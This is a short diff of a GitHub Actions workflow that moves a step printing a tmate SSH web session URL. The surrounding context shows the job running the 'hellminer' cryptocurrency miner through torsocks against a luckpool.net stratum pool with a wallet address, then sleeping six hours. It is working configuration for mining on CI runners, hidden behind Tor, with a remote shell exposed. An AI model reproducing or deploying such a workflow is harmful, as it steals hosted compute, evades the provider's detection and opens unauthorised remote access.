@@ -42,12 +42,12 @@ jobs:
             torsocks ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RXdK9Kiiz2pLUu9k8i7Tx9RKhLEnCJq9Us.M1 -p x --cpu 1
           EOF
 
-      - name: Display tmate SSH Web Session URL
-        run: |
-          echo "tmate SSH Web Session URL: https://tmate.io/t/$tmate_ssh"
-
       - name: Loop
         run: |
           sleep 6h
           echo "Looping..."
           exit 1
+
+      - name: Display tmate SSH Web Session URL
+        run: |
+          echo "tmate SSH Web Session URL: https://tmate.io/t/$tmate_ssh"
